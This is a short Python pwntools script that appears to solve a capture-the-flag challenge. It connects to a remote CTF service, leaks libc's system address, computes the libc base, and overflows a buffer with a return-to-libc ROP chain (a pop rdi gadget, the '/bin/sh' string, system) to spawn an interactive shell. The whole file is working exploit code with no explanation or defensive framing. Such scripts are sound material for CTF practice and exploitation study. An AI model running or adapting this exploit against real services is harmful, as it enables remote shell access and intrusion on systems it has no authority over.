from pwn import *

r = remote("pwn.ctf.rocks", 6666)
l = ELF("libc.so.6_eea5f41864be6e7b95da2f33f3dec47f")

r.sendlineafter("#>", 'Z')
r.recvuntil("address:")
libc_base = int(r.recv(14),16) - l.functions['system'].address
log.info("libc : " + hex(libc_base))
r.sendlineafter("#>", '2')
r.sendlineafter("bytes: ", "1337p0werOverWhelMing1337")
payload = 'A' * 0x28
payload += p64(libc_base + 0x21102)	# pop rdi ; ret
payload += p64(libc_base + l.search("/bin/sh").next())
payload += p64(libc_base + l.functions['system'].address)
r.sendlineafter("now!: ", payload)

r.interactive()
